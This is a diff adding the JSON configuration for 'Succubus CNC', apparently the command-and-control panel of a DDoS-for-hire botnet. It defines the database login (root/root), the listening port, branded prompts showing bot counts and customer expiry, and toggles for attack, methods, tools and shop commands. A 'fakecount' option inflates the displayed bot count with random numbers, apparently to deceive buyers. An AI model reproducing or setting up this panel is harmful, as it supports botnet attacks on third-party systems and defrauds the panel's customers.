@@ -1,0 +1,114 @@
+{
+    "key":"This Key no worky :(",
+
+	"mysql":{
+		"address":"127.0.0.1:3306",
+		"username":"root",
+		"password":"root",
+		"table":"succubus"
+	},
+
+	"connection":{
+		"port":999
+	},
+
+    "fakecount":{
+        "enabled":false,
+        "port":123,
+        "delay":10,
+        "chance":50,
+        "minimum":1000,
+        "maximum":1300
+    },
+
+    "branding":{
+
+        "title":"<<$botcount>> boats | Succubus Custom Build | Serving <<$username>> | Active Sessions <<$onlineusers>> | <<$expiry>> ",
+	"prompt":"<theme>┌──</>[<theme>Succubus</>]-[~/<theme>succubus</>/<theme>cnc</>/<theme><<$username>></>]\r\n<theme>└───</>➤",
+		
+        "assets":{
+            "welcome":"succ",
+            "banner":"succ",
+	    "attack":"attack"
+        },
+	    
+        "login":{
+            "custom":false,
+            "title":"Welcome to Succubus CNC",
+            "asset":"login",
+
+            "-Comment- Remove this line":"If you don't want your string in here use the include function!",
+
+	    "getuser":"<<include(user)>>",
+            "getpass":"<<include(pass)>>"
+        },
+
+        "tos":{ 
+            "enabled":false,
+            "title":"Succubus TOS (unused) plopp wanted this lol",
+            "asset":"tos",
+            "prompt":"succubus/tos >",
+            "answer":"i agree"
+        },
+
+        "errors":{
+            "403":"<theme>403 You Do Not Have Access!</>",
+            "404":"<theme>404 Asset Not Found!</>",
+            "500":"<theme>500 Asset Error!</>"
+        },
+
+        "hardcoded":{
+        
+            "-Comment- Remove this line" : "Removing them will also disable them keep this in mind!",
+    
+            "help":true,
+            "methods":true,
+            "key":true,
+            "tools":true,
+            "devices":true,
+            "theme":true,
+            "attack":true,
+            "chat":true,
+            "shop":true
+        },
+
+        "captcha":{
+            "enabled":false,
+            "title":"[<<$spinner>>] Succcubus Captcha [<<$spinner>>]",
+            "asset":"captcha",
+            "prompt":"captcha> "
+        },
+
+        "misc":{
+	    "prompt check":true,
+            "chat cooldown":5,
+
+            "spinner":["<   3","<-  3","< - 3","<  -3"],
+
+            "-Comment- Remove this line": "This is not implemented in free succubus builds",
+            "prompt colors":[
+                {
+                    "r": 255,
+                    "g": 255,
+                    "b": 255
+                }
+
+            ],
+            "invert gradients":false,
+            "gradient":[
+                {
+                    "r": 222,
+                    "g": 3,
+                    "b": 244
+                },
+                {
+                    "r": 0,
+                    "g": 46,
+                    "b": 250
+                }
+                
+            ]
+
+        }
+    }
+}
